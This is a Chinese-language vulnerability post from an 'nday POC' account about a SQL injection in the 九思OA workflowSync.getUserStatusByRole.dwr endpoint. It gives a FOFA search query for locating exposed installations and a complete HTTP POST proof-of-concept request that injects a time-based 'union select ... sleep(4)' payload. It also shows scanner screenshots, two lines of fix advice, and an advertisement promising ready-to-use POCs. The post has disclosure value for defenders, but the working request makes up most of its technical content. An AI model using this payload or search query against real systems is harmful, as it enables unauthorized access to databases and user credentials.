#  九思OA workflowSync.getUserStatusByRole.dwr SQL注入漏洞   
Superhero  nday POC   2024-12-16 03:18  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
北京九思协同办公软件专业版是面向高端集团企业、多元化集团企业、大型企业的协同办公OA管理软件，由协同工作、  
工作流程  
、公共信息、知识管理、外部邮件、人事基础信息管理、门户应用和办理中心等模块组成，iThink协同办公集团OA软件专业版为企业解决了办公自动化管理的核心需求，实现企业内部知识、市场、销售、研发、人事、行政等方面的协同管理，通过iThink协同办公集团OA软件信息的高度共享和各种业务的流程化，及灵活高效的管理运营模式，使企业通过协同办公集团OA系统的应用环境迅速提升管理水平和运作效率.  
**01******  
  
**漏洞概述**  
  
  
北京九思协同办公软件   
  
/jsoa/workflow/dwr/exec/workflowSync.getUserStatusByRole.dwr接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
app="九思软件-OA"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwL6icuAfeiaoqbhvCsQAV6s9WRBJoqpVhzA3ibJ6uZQiaibmNYPFNBDyDxoUyDxyt8OszoANajDb4ZVKpg/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
POST /jsoa/workflow/dwr/exec/workflowSync.getUserStatusByRole.dwr HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: close

callCount=1
c0-scriptName=workflowSync
c0-methodName=getUserStatusByRole
c0-id=1
c0-param0=string:1
c0-param1=string:1 union select 0,sleep(4)#
xml=true
```  
  
延时4秒  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwL6icuAfeiaoqbhvCsQAV6s9W6S6r34uvIwB2W4QQSiamno1Y68os4WiboMwQFUib9ESkEsV4ib8piaknIcw/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwL6icuAfeiaoqbhvCsQAV6s9WzNxqOJhb8f51ib8bAENkokAEgIEcCVHHeZjnC45pSKL61kZ0dKF9Ffg/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwL6icuAfeiaoqbhvCsQAV6s9WI74e0r767mXnlJELqdqy0PN9ib5FMINxLZNZibsLouk6yRjMLicZoop8w/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwL6icuAfeiaoqbhvCsQAV6s9Wkq12b3kMFEup47yY219xMahKaUCEhyuG8CtOJlpwIukGAr8n9ndUHQ/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、  
对用户传入的参数进行限制。  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10-15个poc。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
